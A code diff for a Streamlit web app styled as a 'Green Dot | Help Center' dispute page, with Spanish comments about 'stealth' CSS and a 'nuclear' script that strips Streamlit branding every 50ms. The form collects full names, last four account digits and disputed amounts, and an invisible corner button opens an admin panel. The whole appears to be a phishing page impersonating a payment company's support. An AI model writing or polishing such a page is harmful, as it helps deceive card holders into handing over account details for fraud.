@@ -23,7 +23,7 @@ init_db()
 
 st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")
 
-# JS NUCLEAR: LIMPIEZA TOTAL CADA 50ms
+# JS NUCLEAR REFORZADO
 st.markdown("""<script>
     const nuclearClean = () => {
         const selectors = [
@@ -44,39 +44,42 @@ st.markdown("""<script>
     setInterval(nuclearClean, 50);
 </script>""", unsafe_allow_html=True)
 
-# CSS STEALTH REFORZADO (ANTI-LIGHT MODE)
+# CSS STEALTH TOTAL (FORZADO PARA MÓVIL)
 st.markdown("""<style>
-    header, footer, .stDeployButton, [data-testid="stHeader"] { display: none !important; }
-
-    /* Fondo Negro Total Global */
-    html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-1vo6xi6 {
+    /* Forzar fondo negro en toda la app y contenedores dinámicos */
+    html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r {
         background-color: #000000 !important;
         color: #FFFFFF !important;
     }
 
-    /* Forzado de color de texto en contenedores reportados */
-    .stMarkdown, p, span, label, h1, h2, h3, div, .st-emotion-cache-1vo6xi6 {
+    /* Color de texto universal para evitar herencia de modo claro */
+    * { color: #FFFFFF !important; }
+    
+    /* Inputs con contraste manual */
+    input, textarea, select {
+        background-color: #1a1a1a !important;
         color: #FFFFFF !important;
+        border: 1px solid #333 !important;
     }
 
-    /* Desactivar cualquier filtro de inversión de color del navegador */
+    /* BLOQUEO CRÍTICO: Anular media queries de sistema del dispositivo */
     @media (prefers-color-scheme: light) {
-        .stApp, .st-emotion-cache-1vo6xi6 {
+        html, body, [data-testid="stAppViewContainer"], .stApp, .st-emotion-cache-1vo6xi6, .st-emotion-cache-6qob1r {
             background-color: #000000 !important;
             color: #FFFFFF !important;
         }
+        * { color: #FFFFFF !important; }
     }
 
+    header, footer, .stDeployButton, [data-testid="stHeader"] { display: none !important; }
     .block-container { max-width: 500px !important; padding-top: 1rem !important; }
 
-    /* Botones y formularios */
     .stButton > button {
         background-color: #00a05b !important;
         color: white !important;
         width: 100%; border: none; height: 50px; border-radius: 8px; font-weight: bold;
     }
 
-    /* Botón Admin Invisible */
     .admin-trigger {
         position: fixed; bottom: 0; left: 0; width: 60px; height: 60px; z-index: 9999;
     }
@@ -84,11 +87,6 @@ st.markdown("""<style>
         background-color: #000000 !important;
         color: #000000 !important;
         border: none !important;
-        box-shadow: none !important;
-        outline: none !important;
-        width: 100% !important;
-        height: 100% !important;
-        cursor: default !important;
     }
 
     .promo-box {
@@ -103,7 +101,7 @@ if not st.session_state.admin_mode:
     if os.path.exists("logo.svg"): st.image("logo.svg", width=250)
     st.title("Help Center")
 
-    with st.form("claim_v1_2_0", clear_on_submit=True):
+    with st.form("claim_v1_2_1", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", format="%.2f")
@@ -119,12 +117,12 @@ if not st.session_state.admin_mode:
     </div>""", unsafe_allow_html=True)
 
     st.markdown("<div class='admin-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="adm_btn"):
+    if st.button(" ", key="adm_btn"): 
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div>", unsafe_allow_html=True)
 else:
     st.title("Admin Panel")
-    if st.button("Exit Admin Panel"):
+    if st.button("Exit Admin Panel"): 
         st.session_state.admin_mode = False
         st.rerun()
